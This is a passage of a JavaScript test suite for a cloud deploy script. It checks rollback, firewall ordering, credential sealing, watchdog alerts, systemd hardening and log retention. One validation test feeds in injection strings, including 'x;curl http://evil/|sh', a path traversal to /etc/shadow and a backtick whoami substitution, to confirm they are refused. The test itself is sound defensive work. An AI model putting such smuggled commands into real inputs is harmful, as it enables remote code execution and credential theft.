  return readFileSync(file, 'utf8').split('\n').filter(Boolean).map((line) => JSON.parse(line));
}

test('B6: a failure AFTER the droplet exists destroys the droplet and deletes the firewall', () => {
  const fixture = createStubs({ failAt: 'assert_post_boot' });
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0, 'a failed post-boot check must fail the deploy');
    assert.ok(
      existsSync(path.join(fixture.dir, 'destroyed-drop-5678')),
      `the droplet was NOT destroyed. stdout: ${result.stdout}\nstderr: ${result.stderr}`,
    );
    assert.ok(existsSync(path.join(fixture.dir, 'deleted-fw-1234')), 'the firewall was NOT deleted');
    assert.ok(!callOrder(fixture).includes('build_image_on_host'), 'nothing may proceed past a failed assertion');
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B6: a failure at a step that carried NO destroy path before (the image build) also rolls back', () => {
  const fixture = createStubs({ failAt: 'build_image_on_host' });
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0);
    assert.ok(existsSync(path.join(fixture.dir, 'destroyed-drop-5678')), `no rollback: ${result.stderr}`);
    assert.ok(existsSync(path.join(fixture.dir, 'deleted-fw-1234')), 'the firewall was left behind');
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B6: the ids are written to digitalocean/runs/ BEFORE anything is destroyed', () => {
  const fixture = createStubs({ failAt: 'assert_post_boot' });
  try {
    spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env: fixture.env });
    const rows = runRecord(fixture);
    const events = rows.map((row) => row.event);
    assert.ok(events.includes('firewall-created'), `no firewall-created row: ${JSON.stringify(events)}`);
    assert.ok(events.includes('droplet-created'), 'no droplet-created row');
    assert.ok(events.includes('rollback-begin'), 'no rollback-begin row');
    assert.ok(events.includes('rollback-done'), 'no rollback-done row');
    assert.ok(!events.includes('create-succeeded'), 'a failed deploy must never record success');

    const begin = rows.find((row) => row.event === 'rollback-begin');
    assert.equal(begin.droplet_id, 'drop-5678', 'the record must name the droplet it is about to destroy');
    assert.equal(begin.firewall_id, 'fw-1234');
    assert.ok(begin.at.endsWith('Z'), 'the record is UTC');
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B6: a run that reaches success destroys nothing and records create-succeeded', () => {
  const fixture = createStubs();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env: fixture.env });
    assert.equal(result.status, 0, `the stubbed happy path failed: ${result.stderr}`);
    assert.ok(!existsSync(path.join(fixture.dir, 'destroyed-drop-5678')), 'a successful deploy destroyed its droplet');
    assert.ok(!existsSync(path.join(fixture.dir, 'deleted-fw-1234')), 'a successful deploy deleted its firewall');
    assert.ok(runRecord(fixture).some((row) => row.event === 'create-succeeded'));
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('A1: the firewall is created BEFORE the droplet, so the host is never briefly unfirewalled', () => {
  const fixture = createStubs();
  try {
    spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env: fixture.env });
    const order = callOrder(fixture);
    const firewall = order.indexOf('create_firewall');
    const droplet = order.indexOf('create_droplet');
    assert.ok(firewall >= 0 && droplet >= 0, `both calls must happen: ${order.join(', ')}`);
    assert.ok(firewall < droplet, `the firewall must come first; the order was: ${order.join(', ')}`);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('A1: the firewall targets the tag the droplet is created with', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const api = readFileSync(path.join(LIB_DIR, 'do_api.py'), 'utf8');
  assert.match(script, /^FIREWALL_TAG="wren-v2"$/m, 'one tag, named once in the deploy script');
  assert.match(api, /"name": f"\{name\}-fw", "tags": \[tag\]/, 'the firewall must target a tag, not a droplet id');
  assert.match(script, /"tags": \["wren", "wren-v2"\]/, 'the droplet must carry that tag at creation');
  assert.match(api, /tag not in \(readback\.get\("tags"\)/, 'the readback must assert the tag is attached');
});

test('A1: --plan and the README both say the firewall comes first', () => {
  assert.match(runPlan(), /Firewall \(created FIRST, before the droplet exists/);
  assert.match(readFileSync(path.join(DO_DIR, 'README.md'), 'utf8'), /firewall (is created )?first/i);
});

test('B6/A1: without the Master\'s word --create refuses before any network path is opened', () => {
  // The unconditional WREN_NO_NETWORK refusal is lifted (Security's second read said lifting it
  // is itself a code change and belongs in this branch). What stops a real create is the word and
  // the preconditions -- so this asserts the FIRST of them, with the seam removed, and that not
  // one step of the sequence ran.
  const fixture = createStubs();
  try {
    const env = { ...fixture.env };
    delete env.WREN_NO_NETWORK;
    delete env.WREN_STUB_DIR;
    delete env.WREN_DEPLOY_CONFIRMED;
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
    assert.notEqual(result.status, 0, '--create must refuse without the word');
    assert.match(result.stderr, /WREN_DEPLOY_CONFIRMED is not 1/);
    assert.equal(callOrder(fixture).length, 0, 'no step of the sequence may run');
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B6/A1: WREN_NO_NETWORK=1 with no stub directory refuses rather than reaching the network', () => {
  const fixture = createStubs();
  try {
    const env = { ...fixture.env };
    delete env.WREN_STUB_DIR;
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /there is no WREN_STUB_DIR to stand in for it/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// A2 and A3. --seal: the name, and the pipeline.
// ---------------------------------------------------------------------------

function sealFixture() {
  const dir = tmp('seal');
  const bin = path.join(dir, 'bin');
  const pile = path.join(dir, 'pile');
  mkdirSync(bin);
  mkdirSync(pile);

  const argvFile = path.join(dir, 'ssh-argv');
  const stdinFile = path.join(dir, 'ssh-stdin');
  writeFileSync(
    path.join(bin, 'ssh'),
    `#!/usr/bin/env bash
printf '%s\\n' "$@" > "$WREN_TEST_SSH_ARGV"
cat > "$WREN_TEST_SSH_STDIN"
exit \${WREN_TEST_SSH_EXIT:-0}
`,
    'utf8',
  );
  chmodSync(path.join(bin, 'ssh'), 0o755);

  const value = 're_FAKE_TEST_VALUE_NOT_A_REAL_KEY_0000';
  writeFileSync(path.join(pile, 'mail-key'), `${value}\n`, { mode: 0o600 });
  chmodSync(path.join(pile, 'mail-key'), 0o600);

  return {
    dir,
    pile,
    value,
    argvFile,
    stdinFile,
    env: {
      ...process.env,
      PATH: `${bin}:${process.env.PATH}`,
      WREN_DEPLOY_CONFIRMED: '1',
      WREN_HOST: 'ops@203.0.113.9',
      WREN_PILE: pile,
      WREN_TEST_SSH_ARGV: argvFile,
      WREN_TEST_SSH_STDIN: stdinFile,
    },
  };
}

test('A2: --seal refuses a name that is not ^[a-z][a-z0-9-]{0,31}$, before it reads anything', () => {
  const bad = [
    'x;curl http://evil/|sh',
    'mail key',
    'MailKey',
    '9lives',
    '-leading-hyphen',
    'a'.repeat(33),
    '../../etc/shadow',
    'mail$key',
    'mail`whoami`',
  ];
  for (const name of bad) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', name, '--dry-run'], {
      encoding: 'utf8',
      env: { ...process.env, WREN_DEPLOY_CONFIRMED: '1' },
    });
    assert.notEqual(result.status, 0, `--seal accepted "${name}"`);
    assert.match(result.stderr, /is not a credential name/);
    assert.doesNotMatch(result.stdout, /systemd-creds/, 'nothing may be printed as a command for a refused name');
  }
});

test('A2: --seal accepts the names the ledger actually uses', () => {
  for (const name of ['mail-key', 'openrouter', 'wren-hot', 'wren-policy']) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', name, '--dry-run'], { encoding: 'utf8' });
    assert.equal(result.status, 0, `--seal refused the legitimate name "${name}": ${result.stderr}`);
    assert.match(result.stdout, new RegExp(`--name=${name} - /etc/wren/creds/${name}\\.cred`));
  }
});

test('A3: --seal pipes the credential on STDIN and writes no plaintext file on either end', () => {
  const fixture = sealFixture();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key'], { encoding: 'utf8', env: fixture.env });
    assert.equal(result.status, 0, `--seal failed: ${result.stderr}`);

    // The value reached ssh's stdin, byte for byte, and nowhere else.
    assert.equal(readFileSync(fixture.stdinFile, 'utf8'), `${fixture.value}\n`);

    const argv = readFileSync(fixture.argvFile, 'utf8');
    assert.match(argv, /^ops@203\.0\.113\.9$/m, 'the ssh target must be the argv');
    assert.match(argv, /sudo systemd-creds encrypt --with-key=host --name=mail-key - \/etc\/wren\/creds\/mail-key\.cred/);
    assert.ok(!argv.includes(fixture.value), 'the credential must NEVER be an argv -- ps shows it to every account');
    assert.ok(!result.stdout.includes(fixture.value), 'the credential must never be printed');
    assert.ok(!result.stderr.includes(fixture.value), 'the credential must never be logged');

    // Nothing new on this laptop's disk: the pile still holds exactly what it held.
    assert.deepEqual(readdirSync(fixture.pile), ['mail-key']);

    // And the ledger row is printed as it happens, with no value in it.
    assert.match(result.stdout, /ledger row: name=mail-key/);
    assert.match(result.stdout, /mode=0600/);
    assert.ok(!result.stdout.includes(fixture.value));
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('A3: --seal fails if the far end fails -- set -o pipefail, not a silent success', () => {
  const fixture = sealFixture();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key'], {
      encoding: 'utf8',
      env: { ...fixture.env, WREN_TEST_SSH_EXIT: '3' },
    });
    assert.notEqual(result.status, 0, 'a failed systemd-creds must fail --seal, not report a sealed credential');
    assert.ok(!result.stdout.includes('sealed.'), 'nothing may claim the credential was sealed');
    // And it must have failed AT THE FAR END, not before reaching it: a --seal that refuses to run
    // at all would satisfy the two lines above while proving nothing about pipefail.
    assert.ok(existsSync(fixture.stdinFile), 'the pipeline must actually have reached ssh');
    assert.equal(readFileSync(fixture.stdinFile, 'utf8'), `${fixture.value}\n`);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('A3: --seal refuses without the Master\'s word, and refuses a pile file that is not 0600', () => {
  const fixture = sealFixture();
  try {
    const noWord = { ...fixture.env };
    delete noWord.WREN_DEPLOY_CONFIRMED;
    let result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key'], { encoding: 'utf8', env: noWord });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /WREN_DEPLOY_CONFIRMED/);
    assert.ok(!existsSync(fixture.stdinFile), 'nothing may be piped anywhere without the word');

    chmodSync(path.join(fixture.pile, 'mail-key'), 0o644);
    result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key'], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /is mode 644/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('A3: --seal --dry-run still opens nothing at all', () => {
  const fixture = sealFixture();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], {
      encoding: 'utf8',
      env: fixture.env,
    });
    assert.equal(result.status, 0);
    assert.ok(!existsSync(fixture.stdinFile), 'a dry run must not reach ssh');
    assert.ok(!result.stdout.includes(fixture.value));
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// A4. The watchdog: a record on disk, and one notice per stale period.
// ---------------------------------------------------------------------------

function watchdogFixture() {
  const dir = tmp('watchdog');
  const stateFile = path.join(dir, 'latest.json');
  // Two directories now, not one. `state` stands in for /srv/wren/state, which the container can
  // write; `watchdog` stands in for /var/lib/wren/watchdog, 0700 root:root, which it cannot
  // (Security's N-1 on the second read). The marker and the record live in the second.
  const watchdogDir = path.join(dir, 'watchdog');
  mkdirSync(watchdogDir);
  return {
    dir,
    watchdogDir,
    stateFile,
    alerts: path.join(watchdogDir, 'alerts.jsonl'),
    marker: path.join(watchdogDir, 'degraded'),
    fresh: () => {
      writeFileSync(stateFile, '{"exit":0}', 'utf8');
      const now = new Date();
      utimesSync(stateFile, now, now);
    },
    stale: (minutes = 91) => {
      writeFileSync(stateFile, '{"exit":0}', 'utf8');
      const then = new Date(Date.now() - minutes * 60 * 1000);
      utimesSync(stateFile, then, then);
    },
    run: (extraEnv = {}) =>
      spawnSync(WATCHDOG, [], {
        encoding: 'utf8',
        env: { ...process.env, WREN_STATE_FILE: stateFile, WREN_WATCHDOG_DIR: watchdogDir, ...extraEnv },
      }),
    alertLines: () =>
      existsSync(path.join(watchdogDir, 'alerts.jsonl'))
        ? readFileSync(path.join(watchdogDir, 'alerts.jsonl'), 'utf8')
            .split('\n')
            .filter(Boolean)
            .map((l) => JSON.parse(l))
        : [],
  };
}

test('A4: the first stale check writes the degraded marker, records it, and asks for a notice', () => {
  const f = watchdogFixture();
  try {
    f.stale();
    const result = f.run();
    assert.notEqual(result.status, 0, 'the first staleness must send a notice');
    assert.ok(existsSync(f.marker), 'no degraded marker was written');
    const lines = f.alertLines();
    assert.equal(lines.length, 1);
    assert.equal(lines[0].event, 'stale');
    assert.match(lines[0].detail, /past the 5400s ceiling/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: staying stale does NOT mail again -- four emails an hour, for ever, was the defect', () => {
  const f = watchdogFixture();
  try {
    f.stale();
    assert.notEqual(f.run().status, 0, 'first notice');
    for (let i = 0; i < 8; i += 1) {
      const again = f.run();
      assert.equal(again.status, 0, 'a repeat check inside the window must not mail');
      assert.match(again.stderr, /DEGRADED, notice already sent/);
    }
    assert.equal(f.alertLines().length, 1, 'exactly one record for one stale period');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: after 6 hours of staleness one repeat notice is due, and only one', () => {
  const f = watchdogFixture();
  try {
    f.stale();
    f.run();
    // Age the marker's last_notified by six hours and one minute.
    const then = Math.floor(Date.now() / 1000) - 6 * 3600 - 60;
    const since = Math.floor(Date.now() / 1000) - 7 * 3600;
    writeFileSync(f.marker, `since=${since}\nlast_notified=${then}\n`, 'utf8');

    const due = f.run();
    assert.notEqual(due.status, 0, 'a repeat notice is due after the repeat window');
    const lines = f.alertLines();
    assert.equal(lines.length, 2);
    assert.equal(lines[1].event, 'stale-repeat');
    assert.equal(String(lines[1].stale_since), String(since), 'the repeat must carry the ORIGINAL stale time');

    const notDue = f.run();
    assert.equal(notDue.status, 0, 'and the window starts again from that notice');
    assert.equal(f.alertLines().length, 2);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: recovery sends exactly one notice, records it, and clears the marker', () => {
  const f = watchdogFixture();
  try {
    f.stale();
    f.run();
    f.fresh();

    const recovery = f.run();
    assert.notEqual(recovery.status, 0, 'one recovery notice is due');
    assert.match(recovery.stderr, /recovered/);
    assert.ok(!existsSync(f.marker), 'the degraded marker must be cleared on recovery');

    const lines = f.alertLines();
    assert.equal(lines.length, 2);
    assert.equal(lines[1].event, 'recovered');
    assert.ok(lines[1].stale_since, 'the recovery record carries the time it went stale');

    const quiet = f.run();
    assert.equal(quiet.status, 0, 'a healthy host mails nothing');
    assert.equal(f.alertLines().length, 2, 'and records nothing further');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: a healthy host that was never stale writes no marker and no record at all', () => {
  const f = watchdogFixture();
  try {
    f.fresh();
    const result = f.run();
    assert.equal(result.status, 0);
    assert.ok(!existsSync(f.marker));
    assert.equal(f.alertLines().length, 0);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: the alert names WHICH thing happened, so a recovery does not arrive worded as a failure', () => {
  const f = watchdogFixture();
  try {
    writeFileSync(
      f.alerts,
      `${JSON.stringify({ event: 'recovered', stale_since: '1757000000', detail: 'a beat completed again' })}\n`,
      'utf8',
    );
    const result = spawnSync('python3', [path.join(DO_DIR, 'bin', 'wren-alert'), 'watchdog', '--dry-run'], {
      encoding: 'utf8',
      env: { ...process.env, WREN_ALERTS_FILE: f.alerts },
    });
    assert.equal(result.status, 0, result.stderr);
    assert.match(result.stdout, /subject: Wren recovered/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('A4: the watchdog unit can actually write what the watchdog writes', () => {
  const svc = readFileSync(path.join(DO_DIR, 'systemd', 'wren-watchdog.service'), 'utf8');
  assert.match(svc, /ProtectSystem=strict/);
  assert.match(
    svc,
    /^ReadWritePaths=\/var\/lib\/wren\/watchdog$/m,
    'under strict with no ReadWritePaths it could write neither -- and it must not be given the container-writable state directory',
  );
  assert.doesNotMatch(svc, /^ReadWritePaths=\/srv\/wren\/state$/m, 'Security N-1: that directory is the container\'s');
});

// ---------------------------------------------------------------------------
// A5. The unit holding a live API key is hardened like the one holding the key.
// ---------------------------------------------------------------------------

test('A5: wren-alert@.service carries the hardening set', () => {
  const svc = readFileSync(path.join(DO_DIR, 'systemd', 'wren-alert@.service'), 'utf8');
  for (const directive of [
    'NoNewPrivileges=true',
    'ProtectSystem=strict',
    'ProtectHome=true',
    'PrivateTmp=true',
    'PrivateDevices=true',
    'CapabilityBoundingSet=',
    'AmbientCapabilities=',
    'RestrictAddressFamilies=AF_UNIX AF_NETLINK AF_INET AF_INET6',
    'SystemCallFilter=@system-service',
    'SystemCallArchitectures=native',
    'RestrictNamespaces=true',
    'RestrictRealtime=true',
    'RestrictSUIDSGID=true',
    'LockPersonality=true',
  ]) {
    assert.ok(svc.includes(directive), `wren-alert@.service is missing ${directive}`);
  }
  // Still root: PID 1 is what decrypts the credential.
  assert.match(svc, /^User=root$/m);
  // And the key still arrives one way only.
  assert.match(svc, /LoadCredentialEncrypted=mail-key:/);
  assert.doesNotMatch(svc, /^Environment=/m);
});

test('A5: the alert unit is no longer the least hardened thing on the host', () => {
  const alert = readFileSync(path.join(DO_DIR, 'systemd', 'wren-alert@.service'), 'utf8');
  const purse = readFileSync(path.join(PURSE_SYSTEMD, 'wren-purse.service'), 'utf8');
  const directives = (text) =>
    new Set(
      text
        .split('\n')
        .map((l) => l.trim())
        .filter((l) => /^[A-Z][A-Za-z]+=/.test(l))
        .map((l) => l.split('=')[0]),
    );
  const hardening = [...directives(purse)].filter((d) =>
    /^(NoNewPrivileges|Protect|Restrict|Lock|Private|SystemCall|CapabilityBoundingSet|AmbientCapabilities|ProcSubset)/.test(d),
  );
  const alertSet = directives(alert);
  const missing = hardening.filter((d) => !alertSet.has(d) && d !== 'MemoryDenyWriteExecute' && d !== 'ProtectClock');
  assert.deepEqual(missing, [], `the alert unit still lacks: ${missing.join(', ')}`);
});

// ---------------------------------------------------------------------------
// A6. One intent path: runs/<beat-id>/intent.json, in all four artefacts.
// ---------------------------------------------------------------------------

test('A6: run-flags, cloud-init, the beat unit and the purse source all agree on the intent path', () => {
  const runFlags = readFileSync(path.join(PKG_DIR, 'run-flags.txt'), 'utf8');
  const yaml = readCloudInit();
  const beatUnit = readFileSync(path.join(PURSE_SYSTEMD, 'wren-beat.service'), 'utf8');
  const purseBeat = readFileSync(path.join(PKG_DIR, '..', 'purse', 'src', 'beat.ts'), 'utf8');

  // The contract, read out of the source that actually opens the file.
  assert.match(purseBeat, /export const INTENT_FILE = 'intent\.json';/, "the purse's own constant moved");
  assert.match(
    purseBeat,
    /join\(options\.runsDir, options\.beatId, INTENT_FILE\)/,
    'the intent is read from <runs>/<beat-id>/intent.json',
  );

  // And nothing anywhere still mounts, creates or names a separate intents directory.
  assert.doesNotMatch(runFlags, /source=\/srv\/wren\/intents/, 'run-flags still mounts /srv/wren/intents');
  assert.doesNotMatch(yaml, /\/srv\/wren\/intents/, 'cloud-init still creates /srv/wren/intents');
  assert.doesNotMatch(beatUnit, /\/srv\/wren\/intents/);
  assert.match(beatUnit, /runs\/<beat-id>\/intent\.json/, 'the beat unit documents the one path');
});

test('A6: the container has exactly two writable mounts, runs/ and state/', () => {
  const runFlags = readFileSync(path.join(PKG_DIR, 'run-flags.txt'), 'utf8');
  const mounts = [...runFlags.matchAll(/^--mount type=bind,source=([^,]+),target=([^,]+),readonly=(\w+)$/gm)];
  assert.equal(mounts.length, 3, 'three mounts: runs, state, image.env');
  const writable = mounts.filter((m) => m[3] === 'false').map((m) => m[1]);
  assert.deepEqual(writable.sort(), ['/srv/wren/runs', '/srv/wren/state']);
  const readonly = mounts.filter((m) => m[3] === 'true').map((m) => m[1]);
  assert.deepEqual(readonly, ['/srv/wren/image.env']);
});

// ---------------------------------------------------------------------------
// A7. Retention sees per-beat directories.
// ---------------------------------------------------------------------------

test('A7: 250 per-beat DIRECTORIES fall to 200, the other 50 archived whole and readable', () => {
  const dir = tmp('retention-dirs');
  try {
    const now = Date.now();
    for (let i = 0; i < 250; i += 1) {
      const beat = path.join(dir, `2026090${(i % 9) + 1}T${String(i).padStart(6, '0')}Z`);
      mkdirSync(beat);
      writeFileSync(path.join(beat, 'intent.json'), JSON.stringify({ beat: i }), 'utf8');
      writeFileSync(path.join(beat, 'beat.log'), `beat ${i}\n`.repeat(4), 'utf8');
      const t = new Date(now - (250 - i) * 60 * 1000);
      utimesSync(path.join(beat, 'intent.json'), t, t);
      utimesSync(path.join(beat, 'beat.log'), t, t);
      utimesSync(beat, t, t);
    }

    const result = spawnSync(RETENTION, [], { encoding: 'utf8', env: { ...process.env, WREN_RUNS_DIR: dir } });
    assert.equal(result.status, 0, `retention failed: ${result.stderr}`);

    const live = readdirSync(dir).filter((n) => n !== 'archive');
    assert.equal(live.length, 200, `expected 200 beat directories to remain, found ${live.length}`);

    const archived = readdirSync(path.join(dir, 'archive'));
    assert.equal(archived.length, 50, 'the other 50 must be archived, not deleted');
    assert.ok(archived.every((n) => n.endsWith('.tar.gz')), 'a beat directory is archived as one .tar.gz');

    // Nothing was lost: the oldest beat's files are still readable inside its archive.
    const oldest = archived.sort()[0];
    const listing = spawnSync('tar', ['-tzf', path.join(dir, 'archive', oldest)], { encoding: 'utf8' });
    assert.equal(listing.status, 0);
    assert.match(listing.stdout, /intent\.json/);
    assert.match(listing.stdout, /beat\.log/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('A7: the 512 MB ceiling archives beat directories too, not only file count', () => {
  const dir = tmp('retention-bytes');
  try {
    const now = Date.now();
    for (let i = 0; i < 12; i += 1) {
      const beat = path.join(dir, `beat-${String(i).padStart(3, '0')}`);
      mkdirSync(beat);
      writeFileSync(path.join(beat, 'beat.log'), 'x'.repeat(4096), 'utf8');
      const t = new Date(now - (12 - i) * 60 * 1000);
      utimesSync(path.join(beat, 'beat.log'), t, t);
      utimesSync(beat, t, t);
    }
    // Ten directories' worth of bytes: two must go even though the count is under 200.
    const result = spawnSync(RETENTION, [], {
      encoding: 'utf8',
      env: {
        ...process.env,
        WREN_RUNS_DIR: dir,
        WREN_RETENTION_KEEP: '200',
        WREN_RETENTION_CEILING_BYTES: String(4096 * 10),
      },
    });
    assert.equal(result.status, 0, result.stderr);
    const live = readdirSync(dir).filter((n) => n !== 'archive');
    assert.equal(live.length, 10, `the byte ceiling must archive whole beats: ${live.length} left`);
    assert.equal(readdirSync(path.join(dir, 'archive')).length, 2);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('A7: a mixed directory of beat directories and plain logs is handled as one ordering', () => {
  const dir = tmp('retention-mixed');
  try {
    const now = Date.now();
    for (let i = 0; i < 6; i += 1) {
      const t = new Date(now - (6 - i) * 60 * 1000);
      if (i % 2 === 0) {
        const beat = path.join(dir, `beat-${i}`);
        mkdirSync(beat);
        writeFileSync(path.join(beat, 'intent.json'), '{}', 'utf8');
        utimesSync(path.join(beat, 'intent.json'), t, t);
        utimesSync(beat, t, t);
      } else {
        const file = path.join(dir, `${i}.log`);
        writeFileSync(file, 'log\n', 'utf8');
        utimesSync(file, t, t);
      }
    }
    const result = spawnSync(RETENTION, [], {
      encoding: 'utf8',
      env: { ...process.env, WREN_RUNS_DIR: dir, WREN_RETENTION_KEEP: '2' },
    });
    assert.equal(result.status, 0, result.stderr);
    const live = readdirSync(dir).filter((n) => n !== 'archive');
    assert.equal(live.length, 2, 'the two newest entries stay, whatever shape they are');
    assert.equal(readdirSync(path.join(dir, 'archive')).length, 4);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N8: archive/ is created 2770, not whatever the umask leaves', () => {
  const dir = tmp('retention-mode');
  try {
    const before = process.umask(0o077); // the harshest umask, the one that showed the defect
    try {
      writeFileSync(path.join(dir, 'a.log'), 'x', 'utf8');
      const result = spawnSync(RETENTION, [], {
        encoding: 'utf8',
        env: { ...process.env, WREN_RUNS_DIR: dir, WREN_RETENTION_KEEP: '0' },
      });
      assert.equal(result.status, 0, result.stderr);
      const mode = statSync(path.join(dir, 'archive')).mode & 0o7777;
      assert.equal(mode.toString(8), '2770', `archive/ is ${mode.toString(8)}, so the wren group cannot read it`);
    } finally {
      process.umask(before);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N8: cloud-init also creates runs/archive at 2770 root:wren', () => {
  const row = cloudInitInstalledPaths().get('/srv/wren/runs/archive');
  assert.ok(row, 'cloud-init never creates runs/archive');
  assert.equal(row.mode, '2770');
  assert.equal(row.owner, 'root');
  assert.equal(row.group, 'wren');
});

// ---------------------------------------------------------------------------
// A8. wren-beat.service's "only writable paths" is enforced by something.
// ---------------------------------------------------------------------------

test('A8: wren-beat.service sets ProtectSystem=strict, so ReadWritePaths carves out of something', () => {
  const svc = readFileSync(path.join(PURSE_SYSTEMD, 'wren-beat.service'), 'utf8');
  assert.match(svc, /^ProtectSystem=strict$/m, 'ReadWritePaths without ProtectSystem does nothing at all');
  const rw = /^ReadWritePaths=(.+)$/m.exec(svc);
  assert.ok(rw, 'no ReadWritePaths');
  const paths = rw[1].split(/\s+/);
  assert.deepEqual(
    paths.sort(),
    ['/srv/wren/runs', '/srv/wren/state'],
    'exactly the two sinks the unit writes, and nothing more',
  );
  // The one path strict could plausibly break -- the docker socket -- is named in the unit with
  // the reason it is not listed and the gate that would catch it being wrong.
  assert.match(svc, /\/run\/docker\.sock is deliberately NOT listed/);
  assert.match(svc, /smoke beat/, 'the fallback must name the gate that catches it');
  assert.match(svc, /^NoNewPrivileges=yes$/m);
  assert.match(svc, /^ProtectHome=yes$/m);
});

// ---------------------------------------------------------------------------
// The notes: one door, unattended-upgrades, the plan's own ASCII check, the
// tarball's checksum, the mail-key mode, logrotate, and the Resend sender.
// ---------------------------------------------------------------------------

test('N1: there is one shell account on this host, not two sharing one key', () => {
  const yaml = readCloudInit();
  assert.doesNotMatch(yaml, /- name: wren-ops/, 'wren-ops was a second door on the same key, used by nothing');
  const accounts = yaml.match(/^ {2}- name: /gm) ?? [];
  assert.equal(accounts.length, 1, 'exactly one login account');
  assert.match(yaml, /- name: ops/);
});

test('N2: --plan says plainly that the ops account is root on this host', () => {
  assert.match(runPlan(), /the desk's SSH key is root on this host/);
});

test('N3: unattended-upgrades is enabled, and cloud-init asserts it out of apt-config dump', () => {
  const yaml = readCloudInit();
  assert.match(yaml, /APT::Periodic::Unattended-Upgrade "1";/, 'installing it is not enabling it');
  assert.match(yaml, /APT::Periodic::Update-Package-Lists "1";/);
  assert.match(yaml, /apt-config dump \| grep -q '\^APT::Periodic::Unattended-Upgrade "1";'/, 'nothing reads it back');
  assert.match(yaml, /Unattended-Upgrade::Automatic-Reboot "false";/);
  assert.match(yaml, /grep -q '\^Unattended-Upgrade::Automatic-Reboot "false";'/, 'the no-reboot rule is asserted too');
});

test('N4: --plan actually renders and ASCII-checks the cloud-init it describes', () => {
  const plan = runPlan();
  assert.match(plan, /== The rendered cloud-init, checked here rather than described ==/);
  assert.match(plan, /rendered bytes: \d{4,}/);
  assert.match(plan, /ASCII guard:\s+PASS - every one of the \d+ rendered bytes is <= 0x7F/);
});

test('N5: the tarball is checksummed ON THE HOST before docker build reads it', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const build = script.slice(script.indexOf('build_image_on_host() {'), script.indexOf('install_host_units() {'));
  assert.match(build, /shasum -a 256/, 'the sha256 must be computed on this laptop');
  assert.match(build, /sha256sum \/tmp\/agent-runtime-src\.tgz/, 'and verified on the host');
  const verify = build.indexOf('sha256sum /tmp/agent-runtime-src.tgz');
  const dockerBuild = build.indexOf('docker build -t wren:local');
  assert.ok(verify > 0 && dockerBuild > verify, 'the checksum must be verified BEFORE docker build, not after');
  assert.match(build, /SOURCE_COMMIT=%s/, 'image.env records the commit that was shipped');
});

test('N6: the mail-key row says the mode systemd-creds actually writes', () => {
  const plan = runPlan();
  assert.match(plan, /mail-key.*\/etc\/wren\/creds\/mail-key\.cred\s+0600/);
  assert.doesNotMatch(plan, /mail-key\.cred\s+0400/, '0400 was a number nobody had read off a host');
});

test('N7: a logrotate config exists, bounds the JSONL sinks only, and is installed by the deploy', () => {
  const config = readFileSync(path.join(DO_DIR, 'logrotate', 'wren'), 'utf8');
  // Only the stanza header -- the paths logrotate actually acts on. A comment naming runs/ to
  // explain why it is NOT here is the opposite of the defect.
  // One stanza per sink: state/ is 2770 root:wren and logrotate refuses a group-writable parent
  // without `su root wren` (the seventh real deploy, 2026-09-05, exited non-zero on exactly that).
  const headers = [...config.matchAll(/^([^#\n].*)\{\s*$/gm)].map((m) => m[1].trim());
  assert.deepEqual(headers.sort(), ['/srv/wren/state/beats.jsonl', '/var/lib/wren/watchdog/alerts.jsonl']);
  const globbed = headers.flatMap((h) => h.split(/\s+/));
  assert.ok(
    !globbed.some((g) => g.startsWith('/srv/wren/runs')),
    'a per-beat glob is exactly what rotate N cannot bound',
  );
